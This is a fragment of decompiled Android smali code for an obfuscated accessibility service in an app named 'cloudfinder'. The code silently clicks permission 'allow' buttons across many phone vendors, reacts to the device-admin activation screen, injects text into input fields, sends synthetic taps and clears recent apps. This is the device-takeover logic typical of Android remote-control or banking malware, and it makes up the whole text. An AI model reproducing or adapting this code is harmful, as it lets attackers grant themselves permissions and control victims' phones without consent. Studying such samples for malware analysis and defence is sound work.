    invoke-virtual {v12, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "Cleared recents: "

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :goto_3
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    goto :goto_5

    :cond_2
    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v12

    if-eqz v12, :cond_3

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v21

    if-eqz v21, :cond_3

    invoke-virtual {v12, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "Cleared recents via parent: "

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_3

    :cond_3
    if-eqz v12, :cond_4

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v12

    goto :goto_4

    :cond_4
    const/4 v12, 0x0

    :goto_4
    if-eqz v12, :cond_5

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v21

    if-eqz v21, :cond_5

    invoke-virtual {v12, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "Cleared recents via grandparent: "

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_3

    :goto_5
    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v10, 0x1

    goto :goto_6

    :cond_5
    const/4 v12, 0x1

    goto :goto_2

    :cond_6
    :goto_6
    if-eqz v10, :cond_7

    goto :goto_8

    :cond_7
    :goto_7
    add-int/lit8 v14, v14, 0x1

    const/16 v8, 0x53

    const/4 v12, 0x1

    goto/16 :goto_1

    :cond_8
    :goto_8
    if-nez v10, :cond_f

    invoke-static {v13}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->س(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/util/ArrayList;

    move-result-object v8

    invoke-virtual {v8}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :goto_9
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v12

    if-eqz v12, :cond_f

    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v14

    if-nez v14, :cond_9

    goto :goto_9

    :cond_9
    sget-object v11, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ر:[Ljava/lang/String;

    array-length v15, v11

    const/4 v3, 0x0

    :goto_a
    if-ge v3, v15, :cond_d

    move-object/from16 v22, v8

    aget-object v8, v11, v3

    invoke-virtual {v14, v8}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_c

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v3

    if-eqz v3, :cond_a

    const/16 v3, 0x10

    invoke-virtual {v12, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_b

    :cond_a
    new-instance v3, Landroid/graphics/Rect;

    invoke-direct {v3}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v12, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v3}, Landroid/graphics/Rect;->width()I

    move-result v8

    if-lez v8, :cond_b

    invoke-virtual {v3}, Landroid/graphics/Rect;->centerX()I

    move-result v8

    invoke-virtual {v3}, Landroid/graphics/Rect;->centerY()I

    move-result v3

    invoke-virtual {v1, v8, v3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    :cond_b
    :goto_b
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Cleared recents via ID: "

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v10, 0x1

    goto :goto_c

    :cond_c
    add-int/lit8 v3, v3, 0x1

    move-object/from16 v8, v22

    goto :goto_a

    :cond_d
    move-object/from16 v22, v8

    :goto_c
    if-eqz v10, :cond_e

    goto :goto_d

    :cond_e
    move-object/from16 v8, v22

    const/16 v3, 0x10

    const/4 v11, 0x0

    const/4 v15, 0x6

    goto :goto_9

    :cond_f
    :goto_d
    if-nez v10, :cond_17

    const/4 v3, 0x6

    new-array v8, v3, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v0, v8, v3

    const-string v11, "\u5173\u95ed\u6240\u6709"

    const/4 v12, 0x1

    aput-object v11, v8, v12

    const-string v11, "\u6e05\u7406"

    const/4 v12, 0x2

    aput-object v11, v8, v12

    const/4 v11, 0x3

    aput-object v6, v8, v11

    aput-object v5, v8, v16

    const/4 v14, 0x5

    aput-object v2, v8, v14

    invoke-static {v13}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->س(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/util/ArrayList;

    move-result-object v13

    invoke-virtual {v13}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v13

    :goto_e
    invoke-interface {v13}, Ljava/util/Iterator;->hasNext()Z

    move-result v15

    if-eqz v15, :cond_16

    invoke-interface {v13}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v17

    if-nez v17, :cond_10

    goto :goto_e

    :cond_10
    invoke-interface/range {v17 .. v17}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v11, 0x0

    :goto_f
    const/4 v12, 0x6

    if-ge v11, v12, :cond_14

    aget-object v12, v8, v11

    invoke-virtual {v3, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_13

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v10

    const/16 v12, 0x10

    if-eqz v10, :cond_11

    invoke-virtual {v15, v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_10

    :cond_11
    new-instance v10, Landroid/graphics/Rect;

    invoke-direct {v10}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v15, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v10}, Landroid/graphics/Rect;->width()I

    move-result v11

    if-lez v11, :cond_12

    invoke-virtual {v10}, Landroid/graphics/Rect;->centerX()I

    move-result v11

    invoke-virtual {v10}, Landroid/graphics/Rect;->centerY()I

    move-result v10

    invoke-virtual {v1, v11, v10}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    :cond_12
    :goto_10
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "Cleared recents via desc: "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v10, 0x1

    goto :goto_11

    :cond_13
    const/16 v12, 0x10

    add-int/lit8 v11, v11, 0x1

    goto :goto_f

    :cond_14
    const/16 v12, 0x10

    :goto_11
    if-eqz v10, :cond_15

    goto :goto_12

    :cond_15
    const/4 v3, 0x0

    const/4 v11, 0x3

    const/4 v12, 0x2

    goto :goto_e

    :cond_16
    const/16 v12, 0x10

    goto :goto_12

    :cond_17
    const/16 v12, 0x10

    const/4 v14, 0x5

    :goto_12
    if-nez v10, :cond_18

    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    :cond_18
    :goto_13
    add-int/lit8 v4, v4, 0x1

    move v3, v12

    const/16 v8, 0x53

    const/4 v11, 0x0

    const/4 v12, 0x1

    const/4 v13, 0x3

    const/4 v14, 0x2

    const/4 v15, 0x6

    goto/16 :goto_0

    :cond_19
    if-nez v10, :cond_1a

    const-string v0, "No clear button found, pressing back"

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v0, 0x1

    invoke-virtual {v1, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :cond_1a
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_14

    :catch_0
    move-exception v0

    const-string v2, "clearAllRecentApps error"

    invoke-static {v7, v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_14
    return-void
.end method

.method public final ث(II)V
    .locals 8

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "click,"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, ","

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    :try_start_0
    const-string v0, "click"

    invoke-virtual {p2, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p2, p1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x1

    aget-object v0, p1, v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    const/4 v1, 0x2

    aget-object p1, p1, v1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    const-string v1, "long"

    invoke-virtual {p2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    const/4 v1, 0x0

    if-eqz p2, :cond_0

    new-instance v3, Landroid/graphics/Path;

    invoke-direct {v3}, Landroid/graphics/Path;-><init>()V

    int-to-float p2, v0

    int-to-float p1, p1

    invoke-virtual {v3, p2, p1}, Landroid/graphics/Path;->moveTo(FF)V

    new-instance p1, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p1}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance p2, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v4, 0x0

    const-wide/16 v6, 0x5dc

    move-object v2, p2

    invoke-direct/range {v2 .. v7}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {p1, p2}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {p1}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    invoke-virtual {p0, p1, v1, v1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    goto :goto_0

    :cond_0
    new-instance v3, Landroid/graphics/Path;

    invoke-direct {v3}, Landroid/graphics/Path;-><init>()V

    int-to-float p2, v0

    int-to-float p1, p1

    invoke-virtual {v3, p2, p1}, Landroid/graphics/Path;->moveTo(FF)V

    new-instance p1, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p1}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance p2, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v4, 0x0

    const-wide/16 v6, 0x64

    move-object v2, p2

    invoke-direct/range {v2 .. v7}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {p1, p2}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {p1}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    new-instance p2, Lڛڜڕڰڑ/ؤ;

    const/4 v0, 0x0

    invoke-direct {p2, v0, p0}, Lڛڜڕڰڑ/ؤ;-><init>(ILjava/lang/Object;)V

    invoke-virtual {p0, p1, p2, v1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    :goto_0
    return-void
.end method

.method public final ح()V
    .locals 5

    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const/4 v0, 0x0

    :goto_0
    if-nez v0, :cond_0

    return-void

    :cond_0
    const/4 v1, 0x1

    :try_start_1
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    const-string v1, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    const/high16 v2, 0x200000

    if-eqz v0, :cond_2

    :try_start_2
    new-instance v3, Landroid/os/Bundle;

    invoke-direct {v3}, Landroid/os/Bundle;-><init>()V

    sget-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ث:Ljava/lang/String;

    invoke-virtual {v3, v1, v4}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    move-result v0

    if-nez v0, :cond_3

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_1

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_1
    return-void

    :cond_2
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_3

    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ث:Ljava/lang/String;

    invoke-virtual {v0, v1, v3}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1, v2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_3
    const-string v0, ""

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ث:Ljava/lang/String;

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ب:Ljava/lang/Boolean;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    return-void
.end method

.method public final ط(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ب:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ح()V

    :cond_0
    :try_start_0
    invoke-static {p1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_2

    const-string p1, "android.widget.FrameLayout"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2

    sget-object p1, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    const-string p2, "oppo"

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_1

    const-string p2, "oneplus"

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2

    :cond_1
    invoke-static {}, Lcom/lite/cloudfinder/App;->؋()Landroid/content/Context;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    const/4 p2, 0x0

    :goto_0
    if-eqz p1, :cond_2

    if-eqz p2, :cond_2

    :try_start_2
    invoke-static {p1, p2}, Lڃٷښـ۝ۼ/ؠ;->ث(Landroid/content/Context;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    :cond_2
    sput-object p0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    return-void
.end method

.method public final ظ()V
    .locals 3

    sget-object v0, Lسۄھؤۏ۫/؋;->ة:Ljava/lang/String;

    const-string v1, "color.support.v7.app.j"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const/4 v0, 0x0

    :goto_0
    if-nez v0, :cond_1

    return-void

    :cond_1
    :try_start_1
    const-string v1, "android:id/button1"

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_2

    goto :goto_1

    :cond_2
    const/4 v1, 0x0

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    if-eqz v1, :cond_3

    const-string v2, "com.coloros.phonemanager"

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v1

    if-eqz v1, :cond_3

    const/16 v1, 0x10

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_3
    :goto_1
    return-void
.end method

.method public final ع(Ljava/lang/String;)V
    .locals 14

    const-string v0, "com.android.settings:id/action_button"

    const-string v1, "android:id/button1"

    sget-boolean v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    if-eqz v2, :cond_0

    return-void

    :cond_0
    sget-boolean v2, Lسۄھؤۏ۫/؋;->ر:Z

    sget-boolean v3, Lسۄھؤۏ۫/؋;->د:Z

    if-nez v2, :cond_1

    if-nez v3, :cond_1

    return-void

    :cond_1
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, "MyAccessSvc"

    if-nez v2, :cond_2

    :try_start_1
    const-string p1, "AutoGrant: root is null"

    invoke-static {v3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_2
    const/16 v4, 0x1d

    new-array v5, v4, [Ljava/lang/String;

    const-string v6, "com.android.permissioncontroller:id/permission_allow_all_button"

    const/4 v7, 0x0

    aput-object v6, v5, v7

    const-string v6, "com.android.permissioncontroller:id/permission_allow_foreground_only_button"

    const/4 v8, 0x1

    aput-object v6, v5, v8

    const-string v6, "com.android.permissioncontroller:id/permission_allow_button"

    const/4 v8, 0x2

    aput-object v6, v5, v8

    const-string v6, "com.android.permissioncontroller:id/permission_allow_one_time_button"

    const/4 v8, 0x3

    aput-object v6, v5, v8

    const-string v6, "com.android.permissioncontroller:id/permission_allow_selected_button"

    const/4 v8, 0x4

    aput-object v6, v5, v8

    const-string v6, "com.google.android.permissioncontroller:id/permission_allow_all_button"

    const/4 v8, 0x5

    aput-object v6, v5, v8

    const-string v6, "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button"

    const/4 v8, 0x6

    aput-object v6, v5, v8

    const-string v6, "com.google.android.permissioncontroller:id/permission_allow_button"

    const/4 v8, 0x7

    aput-object v6, v5, v8

    const-string v6, "com.google.android.permissioncontroller:id/permission_allow_one_time_button"

    const/16 v8, 0x8

    aput-object v6, v5, v8

    const-string v6, "com.samsung.android.permissioncontroller:id/permission_allow_all_button"

    const/16 v8, 0x9

    aput-object v6, v5, v8

    const-string v6, "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button"

    const/16 v8, 0xa

    aput-object v6, v5, v8

    const-string v6, "com.samsung.android.permissioncontroller:id/permission_allow_button"

    const/16 v8, 0xb

    aput-object v6, v5, v8

    const-string v6, "com.samsung.android.permissioncontroller:id/permission_allow_one_time_button"

    const/16 v8, 0xc

    aput-object v6, v5, v8

    const-string v6, "com.android.packageinstaller:id/permission_allow_button"

    const/16 v8, 0xd

    aput-object v6, v5, v8

    const-string v6, "com.android.packageinstaller:id/permission_allow_foreground_only_button"

    const/16 v8, 0xe

    aput-object v6, v5, v8

    const-string v6, "com.miui.packageinstaller:id/permission_allow_button"

    const/16 v8, 0xf

    aput-object v6, v5, v8

    const-string v6, "com.miui.packageinstaller:id/permission_allow_foreground_only_button"

    const/16 v8, 0x10

    aput-object v6, v5, v8

    const-string v6, "com.miui.packageinstaller:id/continue_button"

    const/16 v9, 0x11

    aput-object v6, v5, v9

    const-string v6, "com.lbe.security.miui:id/permission_allow_button_1"

    const/16 v9, 0x12

    aput-object v6, v5, v9

    const-string v6, "com.lbe.security.miui:id/permission_allow_button"

    const/16 v9, 0x13

    aput-object v6, v5, v9

    const-string v6, "com.oplus.permissioncontroller:id/permission_allow_button"

    const/16 v9, 0x14

    aput-object v6, v5, v9

    const-string v6, "com.oplus.permissioncontroller:id/permission_allow_foreground_only_button"

    const/16 v9, 0x15

    aput-object v6, v5, v9

    const-string v6, "com.coloros.permissioncontroller:id/permission_allow_button"

    const/16 v9, 0x16

    aput-object v6, v5, v9

    const-string v6, "com.huawei.permissioncontroller:id/permission_allow_button"

    const/16 v9, 0x17

    aput-object v6, v5, v9

    const-string v6, "com.huawei.permissioncontroller:id/permission_allow_foreground_only_button"

    const/16 v9, 0x18

    aput-object v6, v5, v9

    const-string v6, "com.vivo.permissionmanager:id/permission_allow_button"

    const/16 v9, 0x19

    aput-object v6, v5, v9

    const-string v6, "com.vivo.permissionmanager:id/confirm"

    const/16 v9, 0x1a

    aput-object v6, v5, v9

    const/16 v6, 0x1b

    aput-object v1, v5, v6

    const/16 v6, 0x1c

    aput-object v0, v5, v6

    move v6, v7

    :goto_0
    if-ge v6, v4, :cond_4

    aget-object v9, v5, v6

    invoke-virtual {v2, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v10

    if-eqz v10, :cond_3

    invoke-interface {v10}, Ljava/util/List;->isEmpty()Z

    move-result v11

    if-nez v11, :cond_3

    invoke-interface {v10, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v10, :cond_3

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v11

    if-eqz v11, :cond_3

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "AutoGrant: clicking "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    # 测试模式：延迟 2 秒再点允许，方便看清每个权限框
    new-instance v9, Lcom/lite/cloudfinder/accessibility/ClickDelay;
    invoke-direct {v9, v10}, Lcom/lite/cloudfinder/accessibility/ClickDelay;-><init>(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    sget-object v10, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;
    const-wide/16 v12, 0x7d0
    invoke-virtual {v10, v9, v12, v13}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z


    return-void

    :cond_3
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    :cond_4
    invoke-static {v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٳ(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v3

    if-eqz v3, :cond_5

    return-void

    :cond_5
    const-string v3, "com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd"

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_6

